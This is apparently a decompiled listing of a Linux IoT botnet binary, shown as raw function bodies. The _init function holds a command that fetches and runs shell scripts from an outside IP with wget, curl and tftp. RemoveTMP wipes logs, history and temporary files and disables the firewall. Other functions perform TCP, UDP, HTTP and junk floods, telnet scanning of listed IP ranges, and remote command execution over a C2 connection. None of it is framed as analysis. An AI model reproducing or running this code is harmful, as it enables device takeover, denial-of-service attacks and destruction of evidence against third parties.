        szprintf(v316, (int32_t)"103.255.%d.%d", (int32_t)v132);
        szprintf(v317, (int32_t)"103.35.%d.%d", (int32_t)v132);
        szprintf(v318, (int32_t)"103.49.%d.%d", (int32_t)v132);
        szprintf(v319, (int32_t)"103.62.%d.%d", (int32_t)v132);
        szprintf(v320, (int32_t)"144.48.%d.%d", (int32_t)v132);
        szprintf(v321, (int32_t)"163.47.%d.%d", (int32_t)v132);
        szprintf(v322, (int32_t)"163.53.%d.%d", (int32_t)v132);
        szprintf(v323, (int32_t)"223.29.%d.%d", (int32_t)v132);
        szprintf(v324, (int32_t)"59.153.%d.%d", (int32_t)v132);
        szprintf(v325, (int32_t)"113.176.%d.%d", (int32_t)v132);
        szprintf(v326, (int32_t)"113.175.%d.%d", (int32_t)v132);
        szprintf(v327, (int32_t)"113.177.%d.%d", (int32_t)v132);
        szprintf(v328, (int32_t)"113.183.%d.%d", (int32_t)v132);
        szprintf(v329, (int32_t)"202.164.%d.%d", (int32_t)v132);
        szprintf(v330, (int32_t)"203.134.%d.%d", (int32_t)v132);
        szprintf(v331, (int32_t)"210.56.%d.%d", (int32_t)v132);
        szprintf(v332, (int32_t)"49.156.%d.%d", (int32_t)v132);
        szprintf(v333, (int32_t)"203.210.%d.%d", (int32_t)v132);
        szprintf(v334, (int32_t)"117.181.%d.%d", (int32_t)v132);
        szprintf(v335, (int32_t)"117.178.%d.%d", (int32_t)v132);
        szprintf(v336, (int32_t)"117.177.%d.%d", (int32_t)v132);
        szprintf(v337, (int32_t)"117.176.%d.%d", (int32_t)v132);
        szprintf(v338, (int32_t)"117.170.%d.%d", (int32_t)v132);
        szprintf(v339, (int32_t)"117.171.%d.%d", (int32_t)v132);
        szprintf(v340, (int32_t)"117.162.%d.%d", (int32_t)v132);
        szprintf(v340, (int32_t)"112.26.%d.%d", (int32_t)v132);
        szprintf(v341, (int32_t)"112.27.%d.%d", (int32_t)v132);
        szprintf(v342, (int32_t)"112.28.%d.%d", (int32_t)v132);
        szprintf(v343, (int32_t)"112.29.%d.%d", (int32_t)v132);
        szprintf(v344, (int32_t)"112.30.%d.%d", (int32_t)v132);
        szprintf(v345, (int32_t)"112.31.%d.%d", (int32_t)v132);
        szprintf(v346, (int32_t)"203.150.%d.%d", (int32_t)v132);
    return inet_addr(v347);
=================FUNCTION : sysconf ===================
++++++++ FUNCTION START 48101
++++++++ FUNCTION END 49017
++++++++ FUNCTION LENGTH 916
        case 0: {
        case 1: {
        case 2: {
        case 3: {
        case 4: {
            getdtablesize((int32_t)&v134);
        case 5: {
        case 6: {
        case 7: {
        case 8: {
        case 9: {
        case 10: {
        case 11: {
        case 12: {
        case 13: {
        case 14: {
        case 15: {
        case 16: {
        case 17: {
        case 18: {
        case 19: {
        case 20: {
        case 21: {
        case 22: {
        case 23: {
        case 24: {
        case 25: {
        case 26: {
        case 27: {
        case 28: {
        case 29: {
        case 30: {
            __GI_getpagesize();
        case 31: {
        case 32: {
        case 33: {
        case 34: {
        case 35: {
        case 36: {
        case 37: {
        case 38: {
        case 39: {
        case 40: {
        case 41: {
        case 42: {
        case 43: {
        case 44: {
        case 45: {
        case 46: {
        case 47: {
        case 48: {
        case 49: {
        case 50: {
        case 51: {
        case 52: {
        case 53: {
        case 54: {
        case 55: {
        case 56: {
        case 57: {
        case 58: {
        case 59: {
        case 60: {
        case 61: {
        case 62: {
        case 63: {
        case 64: {
        case 65: {
        case 66: {
        case 67: {
        case 68: {
        case 69: {
        case 70: {
        case 71: {
        case 72: {
        case 73: {
        case 74: {
        case 75: {
        case 76: {
        case 77: {
        case 78: {
        case 79: {
        case 80: {
        case 81: {
        case 82: {
        case 83: {
        case 84: {
        case 85: {
        case 86: {
        case 87: {
        case 88: {
        case 89: {
        case 90: {
        case 91: {
        case 92: {
        case 93: {
        case 94: {
        case 95: {
        case 96: {
        case 97: {
        case 98: {
        case 99: {
        case 100: {
        case 101: {
        case 102: {
        case 103: {
        case 104: {
        case 105: {
        case 106: {
        case 107: {
        case 108: {
        case 109: {
        case 110: {
        case 111: {
        case 112: {
        case 113: {
        case 114: {
        case 115: {
        case 116: {
        case 117: {
        case 118: {
        case 119: {
        case 120: {
        case 121: {
        case 122: {
        case 123: {
        case 124: {
        case 125: {
        case 126: {
        case 127: {
        case 128: {
        case 129: {
        case 130: {
        case 131: {
        case 149: {
            if (__GI_clock_getres(1, NULL, 149, 149) >= 0) {
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 59847
++++++++ FUNCTION END 60917
++++++++ FUNCTION LENGTH 1070
                        while (true) {
                                __libc_close(-1);
                                    int32_t v156 = inet_pton(-1, (char *)v148, (int32_t)&v143, (int32_t)&v143); // 0x80569ee
                                        inet_addr(-1);
                                    if (socket(-1, v148, (int32_t)&v143) >= 0) {
                                        if (__libc_connect(-1, v148, (int32_t)&v143) >= 0) {
                                            __libc_send(-1, v148, (int32_t)&v143, (int32_t)&v143);
                                                int32_t v165 = __libc_recv(-1, v148, (int32_t)&v143, (int32_t)&v143); // 0x8056ade
                                                                            __libc_close(v138);
                                                                        free(v139);
                                                                        free(v139);
                                                                    while (true) {
                                                                                while (true) {
                                                                                            __libc_close(-1);
                                                                                                free(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                                    free(-1);
                                                                                                            __libc_close(-1);
                                                                                                                free(-1);
                                                                                                            free(-1);
                                                                                                            free(-1);
                                                                                                        __libc_close(-1);
                                                                                                            free(-1);
                                                                                                            free(-1);
                                                                                                        free(-1);
                                                                                                    free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                                free(-1);
                                                                                __libc_close(-1);
                                                                                    free(-1);
                                                                                    free(-1);
                                                                                    free(-1);
                                                                                free(-1);
                                                                            __libc_close(-1);
                                                                                free(-1);
                                                                                free(-1);
                                                                    __libc_close(v138);
                                                                free(v139);
                                                                free(v139);
                                                                __libc_close(v138);
                                                            free(v139);
                                                            free(v139);
                                    __libc_close(v138);
                                free(v139);
                                free(v139);
                                __libc_close(v138);
                            free(v139);
                            free(v139);
                    __libc_close(v138);
                free(v139);
                free(v139);
                __libc_close(v138);
            free(v139);
            free(v139);
            __libc_close(v138);
        free(v139);
        free(v139);
        __libc_close(v138);
    free(v139);
    free(v139);
=================FUNCTION : main ===================
++++++++ FUNCTION START 24388
++++++++ FUNCTION END 24991
++++++++ FUNCTION LENGTH 603
    if (geteuid() == 0) {
    getBuild();
    int32_t v127 = __GI_inet_ntoa(v126); // 0x8051682
    printf("BUILD %s:%s\n", (char *)getBuild(), (char *)v127);
    sprintf(v132, v124);
    int32_t v134 = v133 ^ __libc_getpid(); // 0x8051737
    srand(v134);
    int32_t v136 = v135 ^ __libc_getpid(); // 0x8051754
    init_rand(v136);
    getOurIP();
    int32_t v138 = __libc_fork((int32_t)v137); // 0x8051763
        if (__libc_fork((int32_t)v137) != 0) {
        while (true) {
            if (initConnection() == 0) {
                getBuild();
                __GI_inet_ntoa(v126);
                HackerPrint((int32_t)v140, (int32_t)&v150);
                while (true) {
                    if (recvLine((int32_t)v140, (char *)&v143, 0x1000) == -1) {
                    while (true) {
                                    v162 = __libc_waitpid(v161, 0, 1);
                                        while (true) {
                                                    while (true) {
                                                                free(v168);
                            if (strstr(v147, "PING") != v147) {
                                int32_t v169 = strstr(v147, "DUP"); // 0x8051ab7
                                HackerPrint((int32_t)v140, (int32_t)"PONG");
                            while (true) {
                                v154 = recvLine((int32_t)v153, (char *)&v143, 0x1000);
                                while (true) {
                        v162 = __libc_waitpid(v161, 0, 1);
                    while (true) {
                                    while (true) {
                                        while (true) {
                                                while (true) {
                                                processCmd(v142, &v196);
                                            processCmd(v142, &v196);
                                            if (listFork() == 0) {
                                        while (true) {
                                            v154 = recvLine((int32_t)v153, (char *)&v143, 0x1000);
                                        szprintf(v146, (int32_t)"%s 2>&1", v183);
                                        int32_t v205 = fdpopen(v146, "r"); // 0x8051cc2
                                        if (fdgets(v146, 1024, v205) != 0) {
                                            while (fdgets(v146, 1024, v205) != 0) {
                                            fdpclose(v205);
                                        fdpclose(v205);
        __libc_waitpid(v138, (int32_t)&v206, 0);
    while (true) {
        if (initConnection() == 0) {
    free(v208);
        free(v208);
    while (true) {
        if (recvLine((int32_t)v140, (char *)&v143, 0x1000) != -1) {
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 54935
++++++++ FUNCTION END 58466
++++++++ FUNCTION LENGTH 3531
                    while (true) {
                        while (true) {
                                        while (true) {
                                                                                while (true) {
                                                                                                while (true) {
                                                                                            while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                                    while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                    while (true) {
                                                                        while (true) {
                                                                while (true) {
                                                                    while (true) {
                                                            while (true) {
                                                                while (true) {
                                                        while (true) {
                                    while (true) {
            while (true) {
                                    while (true) {
        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 3567
++++++++ FUNCTION END 4006
++++++++ FUNCTION LENGTH 439
                    v139 = __vfork(v135);
                        __libc_close(v134);
                        __libc_close(v136);
                            __libc_close(v134);
                            __libc_close(v136);
                            __libc_close(v134);
                        __libc_close(v136);
                            __libc_close(v136);
                        __libc_close(v134);
                v137 = getdtablesize(v135);
                        v139 = __vfork(v135);
                            __libc_close(v134);
                            __libc_close(v136);
                                __libc_close(v134);
                                __libc_close(v136);
                                __libc_close(v134);
                            __libc_close(v136);
                                __libc_close(v136);
                            __libc_close(v134);
                    v139 = __vfork(v135);
                        __libc_close(v134);
                        __libc_close(v136);
                            __libc_close(v134);
                            __libc_close(v136);
                            __libc_close(v134);
                        __libc_close(v136);
                            __libc_close(v136);
                        __libc_close(v134);
                v137 = getdtablesize(v135);
                        v139 = __vfork(v135);
                            __libc_close(v134);
                            __libc_close(v136);
                                __libc_close(v134);
                                __libc_close(v136);
                                __libc_close(v134);
                            __libc_close(v136);
                                __libc_close(v136);
                            __libc_close(v134);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 37766
++++++++ FUNCTION END 38327
++++++++ FUNCTION LENGTH 561
    int32_t v134 = __get_hosts_byname_r(a1, 2, v131, a4, a5, a6, v133); // 0x80538b1
                            if (inet_aton(v154, a3) != 0) {
                            __open_nameservers();
                            v157 = __dns_lookup(v154, 1, v140, (int32_t)&v139, v156, (int32_t)&v143);
                                    free(v143);
                                        free(v141);
                                        free(v141);
                                free(v143);
                                free(v141);
                                if (inet_aton(v154, a3) != 0) {
                                __open_nameservers();
                                v157 = __dns_lookup(v154, 1, v140, (int32_t)&v139, v156, (int32_t)&v143);
                                        free(v143);
                                            free(v141);
                                            free(v141);
                                    free(v143);
                                    free(v141);
        if (inet_aton(v154, a3) != 0) {
        __open_nameservers();
        v157 = __dns_lookup(v154, 1, v140, (int32_t)&v139, v156, (int32_t)&v143);
                free(v143);
                    free(v141);
                    free(v141);
            free(v143);
            free(v141);
        if (inet_aton(v154, a3) != 0) {
        __open_nameservers();
        v157 = __dns_lookup(v154, 1, v140, (int32_t)&v139, v156, (int32_t)&v143);
                free(v143);
                    free(v141);
                    free(v141);
            free(v143);
            free(v141);
=================FUNCTION : _init ===================
++++++++ FUNCTION START 320
++++++++ FUNCTION END 638
++++++++ FUNCTION LENGTH 318
        "wget",
        "/dev/netslink/",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
        "etrbhhgetrb",
        "http",
        "Unknown host",
        "Host name lookup failure",
    char (*v42)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
    __get_pc_thunk_bx(0);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 12603
++++++++ FUNCTION END 13059
++++++++ FUNCTION LENGTH 456
        rand_cmwc(v134);
    int32_t result = getHost(a1, &v136); // 0x804f08f
    int32_t v138 = socket(2, 3, 6); // 0x804f0c7
        result2 = HackerPrint((int32_t)v139, (int32_t)"Failed opening raw socket.");
    if (__GI_setsockopt(v138, 0, 3, (int32_t)&v140, 4) >= 0) {
        *v144 = (int16_t)rand_cmwc(v143);
        int32_t v145 = rand_cmwc(v143); // 0x804f1f3
                while (true) {
                        int32_t v171 = ((int32_t)(v170 | _strncmp(v158, "rst", 4) % 2 == 0) | v165 & -256) ^ 1; // 0x804f30c
                                    int32_t v178 = ((int32_t)(v177 | _strncmp(v158, "psh", 4) % 2 == 0) | v165 & -256) ^ 1; // 0x804f402
                                        HackerPrint(4, (int32_t)"psh");
                                        v166 = "psh";
                                        v166 = "psh";
                rand_cmwc((int32_t)v162);
                    v152 = rand_cmwc((int32_t)v158);
                *v154 = (int16_t)tcpcsum();
                while (true) {
                    __libc_sendto(v151, v140, v135, v136, v137, 0);
                    *(int16_t *)(v142 | 4) = (int16_t)rand_cmwc(v151);
                    *v146 = rand_cmwc(v151);
                    *v144 = (int16_t)rand_cmwc(v151);
                    *v154 = (int16_t)tcpcsum();
        rand_cmwc((int32_t)v158);
            v152 = rand_cmwc((int32_t)v158);
        *v154 = (int16_t)tcpcsum();
        while (true) {
            __libc_sendto(v151, v140, v135, v136, v137, 0);
            *(int16_t *)(v142 | 4) = (int16_t)rand_cmwc(v151);
            *v146 = rand_cmwc(v151);
            *v144 = (int16_t)rand_cmwc(v151);
            *v154 = (int16_t)tcpcsum();
        result2 = HackerPrint((int32_t)v139, (int32_t)"Failed setting raw headers mode.");
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 40520
++++++++ FUNCTION END 43995
++++++++ FUNCTION LENGTH 3475
                while (true) {
                    while (true) {
                            while (true) {
                                    while (true) {
                                                                                                free(v171);
                                                                                            free(v171);
                                                                                                        free(v171);
                                                                                                    free(v171);
                                                                                                free(v171);
                                                                                                free(v171);
                                                                                            free(v171);
                                                                                free(v171);
                                                                                free(v171);
                                                                            free(v171);
                                                                                        free(v171);
                                                                                        free(v171);
                                                                                    free(v171);
                                                                                free(v171);
                                                                                free(v171);
                                                                            free(v171);
                while (true) {
                while (true) {
            while (true) {
                                                                free(v171);
                                                                free(v171);
                                                            free(v171);
                                                                        free(v171);
                                                                        free(v171);
                                                                    free(v171);
                                                                free(v171);
=================FUNCTION : StartTheLelz ===================
++++++++ FUNCTION START 10234
++++++++ FUNCTION END 10955
++++++++ FUNCTION LENGTH 721
    int32_t v134 = v133 ^ rand_cmwc(0); // 0x804d009
    srand(v134);
    while (true) {
                case 0: {
                                    socket(0x10000 * v155 / 0x10000, v156, v154);
                                        if (__libc_connect(v156, v154, 0) == -1) {
                                                sclose(v156);
                    socket(0x10000 * v155 / 0x10000, v156, v154);
                case 1: {
                            sclose(v151);
                            sclose(v166);
                        getsockopt(v151, v167, v165, 10, v161);
                            sclose(v151);
                case 2: {
                case 3: {
                    if (__libc_send(v168, v137, v148, (int32_t)&v152) >= 0) {
                        if (__libc_send(v168, v137, v148, (int32_t)&v152) >= 0) {
                case 4: {
                case 5: {
                    if (__libc_send(v169, v142, v137, v148) >= 0) {
                        if (__libc_send(v169, v142, v137, v148) >= 0) {
                case 6: {
                                    get_telstate_host();
                                    HackerPrint(v140, v142);
                                    get_telstate_host();
                                    HackerPrint(v140, v142);
                case 7: {
                    if (__libc_send(v172, v140, v142, v137) >= 0) {
                        sclose(v172);
        while (true) {
=================FUNCTION : prints ===================
++++++++ FUNCTION START 2027
++++++++ FUNCTION END 2479
++++++++ FUNCTION LENGTH 452
                    while (true) {
                        printchar(v136, v135);
                        printchar(v136, v135);
                            printchar(v136, v135);
                    printchar(v136, (int32_t)*a2);
                        printchar(v136, (int32_t)*v141);
                    printchar(v136, v135);
                        printchar(v136, v135);
                printchar(v136, v135);
                    printchar(v136, v135);
            printchar(v136, (int32_t)*a2);
                printchar(v136, (int32_t)*v141);
            printchar(v136, v135);
                printchar(v136, v135);
            while (true) {
                printchar(v136, v135);
                printchar(v136, v135);
                    printchar(v136, v135);
            printchar(v136, (int32_t)*a2);
                printchar(v136, (int32_t)*v141);
            printchar(v136, v135);
                printchar(v136, v135);
        printchar(v136, v135);
            printchar(v136, v135);
    printchar(v136, (int32_t)*a2);
        printchar(v136, (int32_t)*v141);
    printchar(v136, v135);
        printchar(v136, v135);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 68305
++++++++ FUNCTION END 68962
++++++++ FUNCTION LENGTH 657
            while (true) {
                                v148 = __open_etc_hosts();
                                    while (true) {
        while (true) {
            int32_t v159 = __GI_strcasecmp(v154, v158, v157, v157); // 0x80585b2
        while (true) {
            if (fgets(v141, v139, v137) != 0) {
                __GI_fclose((int16_t *)v139);
        if (inet_pton(10, (char *)v161, v142, v135) >= 1) {
            __GI_fclose((int16_t *)v139);
        while (true) {
            while (true) {
                if (fgets(v141, v139, v137) != 0) {
                        while (true) {
                                while (true) {
                                            while (true) {
                                while (true) {
                                    int32_t v189 = fgets(v141, v139, v188); // 0x8058619
                                        v169 = __GI_fclose((int16_t *)v139);
                                    if (inet_pton(2, (char *)v192, (int32_t)v143, v138) >= 1) {
                                while (true) {
                                    __GI_fclose((int16_t *)v139);
                        __GI_fclose((int16_t *)v139);
                            v148 = __open_etc_hosts();
                                while (true) {
=================FUNCTION : sendUDP ===================
++++++++ FUNCTION START 12101
++++++++ FUNCTION END 12446
++++++++ FUNCTION LENGTH 345
        rand_cmwc(2);
    int32_t result = getHost(a1, &v136); // 0x804eb3f
        int32_t v138 = socket(2, 2, 17); // 0x804eb86
                makeRandomStr(v141, a5);
                while (true) {
                    __libc_sendto(v138, v140, a5, 0, (int32_t)&v135, 16);
                            rand_cmwc((int32_t)v133);
            result3 = HackerPrint((int32_t)v137, (int32_t)"Failed opening raw socket.");
    int32_t v144 = socket(2, 3, 17); // 0x804ec8f
        if (__GI_setsockopt(v144, 0, 3, (int32_t)&v145, 4) < 0) {
            result4 = HackerPrint((int32_t)v137, (int32_t)"Failed setting raw headers mode.");
            int32_t v147 = v146 ^ rand_cmwc((int32_t)v133); // 0x804ed22
            srand(v147);
            int32_t v148 = random(); // 0x804ed2c
            init_rand(v148);
        *v152 = (int16_t)rand_cmwc(v151);
            v153 = rand_cmwc(v151);
        makeRandomStr((char *)v155, v158);
        while (true) {
            __libc_sendto(v162, (int32_t)&v163, (int32_t)&v163, (int32_t)&v163, (int32_t)&v163, (int32_t)&v163);
            *v152 = (int16_t)rand_cmwc(v162);
                v164 = rand_cmwc(v162);
            *(int16_t *)(v150 | 4) = (int16_t)rand_cmwc(v166);
    result4 = HackerPrint((int32_t)v137, (int32_t)"Failed opening raw socket.");
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 32492
++++++++ FUNCTION END 33532
++++++++ FUNCTION LENGTH 1040
        while (true) {
                while (true) {
                    while (true) {
                        while (true) {
                                                while (true) {
                                                    while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                                while (true) {
                                                                                            while (true) {
                                                                                    while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                    while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                            while (true) {
                                                                        while (true) {
    while (true) {
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 60920
++++++++ FUNCTION END 61442
++++++++ FUNCTION LENGTH 522
    int32_t v135 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v134); // 0x8056f25
        int32_t v148 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v134); // 0x8056f43
        while (true) {
            if (fgets(v146, 128, v138) == 0) {
                __GI_fclose((int16_t *)v136);
        while (true) {
            while (true) {
            while (true) {
                        while (true) {
                            while (true) {
                    while (true) {
                        while (true) {
                            free(v184);
    while (true) {
        if (fgets(v146, 128, v138) != 0) {
        __GI_fclose((int16_t *)v136);
    while (true) {
    while (true) {
        if (fgets(v146, 128, v138) != 0) {
        __GI_fclose((int16_t *)v136);
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 24014
++++++++ FUNCTION END 24246
++++++++ FUNCTION LENGTH 232
    int32_t v134 = socket(2, 2, 0); // 0x80513cf
        inet_addr((int32_t)"8.8.8.8");
        if (__libc_connect(v134, (int32_t)&v135, 16) != -1) {
            int32_t v138 = __GI_getsockname(v134, (int32_t)&v137, (int32_t)&v136); // 0x805147f
                int32_t v139 = __libc_open("/proc/net/route", 0); // 0x80514b3
                if (fdgets(v141, 0x1000, v139) != 0) {
                    while (true) {
                        if (strstr(v141, "\t00000000\t") == 0) {
                            if (fdgets(v141, 0x1000, v139) == 0) {
                            while (true) {
                                    __libc_close(v139);
                                        __libc_close(v134);
                                    __libc_close(v134);
                __libc_close(v139);
                    __libc_close(v134);
                __libc_close(v134);
=================FUNCTION : sendJUNK ===================
++++++++ FUNCTION START 13062
++++++++ FUNCTION END 13374
++++++++ FUNCTION LENGTH 312
    int32_t v136 = getdtablesize(v135); // 0x804f614
    int32_t result2 = getHost(a1, &v139); // 0x804f652
        while (true) {
        while (true) {
                        __libc_close(v164);
                    getsockopt(v158, v157, 0x2710, v155, (int32_t)&v163);
                        __libc_close(v158);
                    makeRandomStr((char *)v154, v135);
                    if (__libc_send(v158, v157, v147, v155) != -1) {
                    __libc_close(v158);
                    socket(v154, v135, v159);
                    if (__libc_connect(v154, v135, v159) == -1) {
                    __libc_close(v154);
        while (true) {
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 63201
++++++++ FUNCTION END 64130
++++++++ FUNCTION LENGTH 929
                        free(result);
                if (__libc_open((char *)v143, a4 != -1 ? v148 | 0x8000 : v148) < 0) {
                        free(result);
                            free(v140);
                    free(result);
            if (__libc_open((char *)v143, a4 != -1 ? v148 | 0x8000 : v148) < 0) {
                    free(result);
                            free(v140);
                free(v140);
        if (__libc_open((char *)v143, a4 != -1 ? v148 | 0x8000 : v148) < 0) {
                free(result);
                            free(v140);
                free(result);
=================FUNCTION : RemoveTMP ===================
++++++++ FUNCTION START 11419
++++++++ FUNCTION END 11567
++++++++ FUNCTION LENGTH 148
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"history -c");
    __libc_system((int32_t)"rm -rf ~/.bash_history");
    __libc_system((int32_t)"rm -rf /bin/netstat");
    __libc_system((int32_t)"history -w");
    __libc_system((int32_t)"pkill -9 busybox");
    __libc_system((int32_t)"pkill -9 perl");
    __libc_system((int32_t)"service iptables stop");
    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");
=================FUNCTION : sendHOLD ===================
++++++++ FUNCTION START 13377
++++++++ FUNCTION END 13665
++++++++ FUNCTION LENGTH 288
    int32_t v136 = getdtablesize(v135); // 0x804f9f4
    int32_t result2 = getHost(a1, &v139); // 0x804fa32
        while (true) {
        while (true) {
                        __libc_close(v159);
                    getsockopt(v161, v158, 0x2710, v154, (int32_t)&v155);
                        __libc_close(v161);
                    __libc_close(v165);
                    socket(v152, v135, (int32_t)&v155);
                    if (__libc_connect(v152, v135, (int32_t)&v155) == -1) {
                    __libc_close(v152);
        while (true) {
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5052
++++++++ FUNCTION END 5257
++++++++ FUNCTION LENGTH 205
    int32_t v134 = __libc_open("/proc/cpuinfo", 0); // 0x8048f5a
    if (fdgets(v136, 0x1000, v134) != 0) {
        while (true) {
            uppercase((char *)&v135);
            if (strstr(v136, "BOGOMIPS") != v136) {
                if (fdgets(v136, 0x1000, v134) == 0) {
                while (true) {
                                while (true) {
                                            __libc_close(v134);
    __libc_close(v134);
=================FUNCTION : print ===================
++++++++ FUNCTION START 2736
++++++++ FUNCTION END 3138
++++++++ FUNCTION LENGTH 402
        while (true) {
                printchar(a1, (int32_t)*v138);
                        while (true) {
                                                int32_t v155 = prints(v134, (char *)&v135, v148, v145); // 0x804884a
                                                int32_t v157 = printi(v134, (int64_t)v156, 10, 0, v148, v145, 97) + result2; // 0x804880c
                                            int32_t v159 = printi(v134, (int64_t)v158, 16, 0, v148, v145, 65) + result2; // 0x80487b8
                                        int32_t v161 = printi(v134, (int64_t)v160, 16, 0, v148, v145, 97) + result2; // 0x8048764
                                    int32_t v163 = printi(v134, (int64_t)v162, 10, 1, v148, v145, 97) + result2; // 0x8048710
                                v141 = prints(v134, v164, v148, v145) + result2;
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 49781
++++++++ FUNCTION END 50475
++++++++ FUNCTION LENGTH 694
        while (true) {
            v145 = getuid();
            if (v145 == geteuid()) {
                v146 = getgid();
                if (v146 == getegid()) {
    v145 = getuid();
    if (v145 != geteuid()) {
    v146 = getgid();
    if (v146 == getegid()) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 2482
++++++++ FUNCTION END 2733
++++++++ FUNCTION LENGTH 251
            while (true) {
                        printchar((int32_t *)a1, 45);
                        result = prints(a1, v138, a5 - 1, a6);
            result = prints(a1, v139, a5, a6);
                    printchar((int32_t *)a1, 45);
                    result = prints(a1, v138, a5 - 1, a6);
        result2 = prints(a1, v139, a5, a6);
        result2 = prints(a1, (char *)&v150, a5, a6);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 5260
++++++++ FUNCTION END 5425
++++++++ FUNCTION LENGTH 165
    int32_t v134 = __libc_open("/proc/cpuinfo", 0); // 0x8049122
    if (fdgets(v136, 0x1000, v134) == 0) {
        __libc_close(v134);
    while (true) {
        uppercase((char *)&v135);
        if (strstr(v136, "BOGOMIPS") == v136) {
        if (fdgets(v136, 0x1000, v134) == 0) {
    __libc_close(v134);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 66881
++++++++ FUNCTION END 67387
++++++++ FUNCTION LENGTH 506
        return inet_ntop4(v139, v137, v135);
        while (true) {
                            while (true) {
                                                    v182 = inet_ntop4((int32_t)v141, (int32_t)v155, v154);
                                            v179 = v138 + sprintf(v176, (int32_t)"%x");
                                        v182 = inet_ntop4((int32_t)v141, (int32_t)v155, v154);
                                v179 = v138 + sprintf(v176, (int32_t)"%x");
                while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 11734
++++++++ FUNCTION END 11921
++++++++ FUNCTION LENGTH 187
    random();
    random();
    sprintf(v137, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n");
        while (true) {
            if (__libc_fork(v138) == 0) {
